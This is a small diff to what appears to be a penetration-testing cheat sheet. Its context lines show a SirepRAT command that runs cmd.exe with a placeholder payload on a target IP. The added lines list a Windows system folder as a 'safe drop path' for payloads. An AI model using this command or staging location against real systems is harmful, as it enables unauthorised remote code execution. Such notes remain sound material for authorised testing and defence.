@@ -677,3 +677,8 @@ python SirepRAT.py <IP> LaunchCommandWithOutput --return_output --cmd "C:\Window
 
 python SirepRAT.py <IP> LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c <PAYLOAD>" --v
 ```
+
+### Common safe drop paths
+```
+C:\\Windows\\System32\\spool\\drivers\\color\\
+```
